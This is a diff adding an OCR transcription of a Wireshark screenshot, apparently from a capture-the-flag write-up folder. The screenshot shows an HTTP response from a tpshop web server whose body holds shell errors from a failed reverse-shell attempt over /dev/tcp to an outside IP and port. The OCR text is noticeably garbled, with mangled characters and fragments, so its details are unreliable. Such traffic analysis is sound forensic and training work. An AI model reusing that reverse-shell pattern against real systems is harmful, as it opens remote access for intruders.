@@ -1,0 +1,20 @@
+# OCR: a8faced513492f5de889343ec9f6ecf3.webp
+# 来源: .\02-WriteUp\2024\a8faced513492f5de889343ec9f6ecf3.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:17
+
+(Md Wireshark - 3883 HTTP i (tep.stream eq 180) - tcpdump ticap
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, @4 Mar 2022 07:27:23 GMT
+Content-Type: text/html; charset=UTF-8
+‘Transfer-Encoding: chunked
+Connection: close
+Vary: Accept-Encoding
+Content-Encoding: gzip
+be6a@ad@e0/bin/sh: connect: Connection refused
+Ybin/sh: /dev/tcp/222.2.2.2/10000: Connection refused
+B
+ou / vor oot /ww. tpshop .com/application
+dea75af74315,
+esab254d30F
